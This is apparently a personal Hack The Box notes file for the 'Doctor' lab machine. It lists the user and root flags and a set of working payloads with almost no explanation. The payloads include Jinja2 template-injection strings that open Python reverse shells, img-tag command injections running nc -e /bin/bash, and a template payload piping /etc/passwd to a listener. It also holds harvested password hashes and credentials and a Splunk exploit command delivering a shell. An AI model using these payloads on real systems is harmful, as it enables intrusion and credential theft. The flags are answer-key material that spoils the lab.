# HTB Doctor

# Saikat Karmakar | Dec 29:2020

1. user flag.
```
7a06518ea92f9fcc789f0951036b1552
```
2. root flag.
```
15dcef49e24314f4322775fd373a3e73
```

**Notes**
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.45\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.47\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}



<img src=http://10.10.14.45/$(nc.traditional$IFS-e$IFS/bin/bash&IFS'10.10.10.209'$IFS'9999')>

<img src=http://10.10.14.45/$(nc.traditional$IFS-e$IFS/bin/bash&IFS%2710.10.10.209%27$IFS%279999%27)%3E

<img src=http://10.10.14.45/$(nc.traditional$IFS-e$IFS/bin/bash$IFS%2710.10.14.176%27$IFS%271234%27)%3E

{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc 10.10.14.45 9999')['read']() == 'chiv' %} a {% endif %}


```
user : adminadmin@doctor.htbdefault.gif
hash : $2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S

user : shaun
pass : Guitar123


$6$TOs.jXjSRTCsfPsw$2St.t9lH9fpXd9mCEmCizWbb67gMFfBIJU37QF8wsHKSGud1QNMCuUdWkD8IFSgCZr5.W6zkjmNACGhGafQZj1


```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.47 --username shaun --password Guitar123 --payload "nc.traditional -e/bin/bash '10.10.14.45' '1234'"
```